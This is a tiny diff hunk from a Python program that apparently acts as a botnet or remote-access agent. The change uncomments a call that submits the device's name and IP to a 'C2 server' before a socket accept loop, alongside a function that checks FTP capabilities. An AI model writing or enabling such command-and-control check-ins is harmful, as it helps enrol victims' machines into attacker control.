@@ -152,7 +152,7 @@ def check_ftp_capabilities(hostname):
 if __name__ == '__main__':
 
     # Submitting Device Name and IP to the C2 server.
-    # add_device()
+    add_device()
 
     while True:
         conn, addr = s.accept()
